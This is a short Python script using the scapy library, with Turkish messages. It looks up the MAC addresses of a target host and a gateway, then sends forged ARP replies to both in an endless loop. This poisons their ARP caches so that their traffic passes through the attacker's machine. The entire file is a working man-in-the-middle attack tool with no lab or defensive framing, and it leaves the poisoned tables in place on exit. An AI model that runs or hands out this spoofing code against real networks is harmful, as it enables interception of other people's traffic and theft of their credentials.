from scapy.all import ARP, send, arping
import time

def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[ARP].hwsrc
    return None

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("Hedef veya ağ geçidi MAC adresi alınamadı.")
        return

    print("[*] ARP spoofing başlatıldı... Ctrl+C ile durdurabilirsiniz.")
    try:
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] ARP spoofing durduruldu.")
